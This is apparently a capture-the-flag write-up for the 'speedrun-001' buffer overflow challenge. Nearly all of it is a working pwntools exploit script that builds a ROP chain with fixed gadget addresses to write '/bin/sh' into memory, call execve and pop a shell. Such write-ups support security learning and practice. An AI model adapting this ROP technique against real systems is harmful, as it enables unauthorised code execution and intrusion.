# Challenge Theory
This is a buffer overflow challenge that requests information...
I sent it a rop chain and popped a shell instead.
# Solution
Nothing interesting really.
It's a basic ropchain that write's "/bin/sh" to the .data section, and then calls execve.
## Exploit Script
```python
#!/usr/bin/python3
import pwn
import sys
binary = "./speedrun-001"
pwn.context.binary = binary
pwn.context.encoding = "latin"

padding = 1032
gadgets = {
    "pop_rdi_ret":0x400686,
    "pop_rax_ret":0x415664,
    "pop_rdx_ret":0x44be16,
    "pop_rsi_ret":0x4101f3,
    "mov_qword_ptr_rax_rdx":0x48d251,
    "syscall_ret":0x474e65,
    "data_section":0x6b90e0,
    "data_section_1":0x6b90e1
}
payload = b"A"*padding
payload = pwn.flat(
    b"A"*padding,
    pwn.p64(gadgets["pop_rax_ret"]),
    pwn.p64(gadgets["data_section"]),
    pwn.p64(gadgets["pop_rdx_ret"]),
    0x68732f6e69622f2f,
    pwn.p64(gadgets["mov_qword_ptr_rax_rdx"]),
    pwn.p64(gadgets["pop_rax_ret"]),
    0x3b,
    pwn.p64(gadgets["pop_rdi_ret"]),
    pwn.p64(gadgets["data_section_1"]),
    pwn.p64(gadgets["pop_rsi_ret"]),
    0,
    pwn.p64(gadgets["pop_rdx_ret"]),
    0,
    pwn.p64(gadgets["syscall_ret"])
)

if ("input" in sys.argv):
    with open("input", "wb") as io:
        io.write(payload)

if ("log" in sys.argv):
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    pwn.info(io.readrepeat(1))
    io.send(payload)
    if ("interactive" in sys.argv):
        io.interactive()

    if ("output" in sys.argv):
        pwn.info(io.readrepeat(1))
```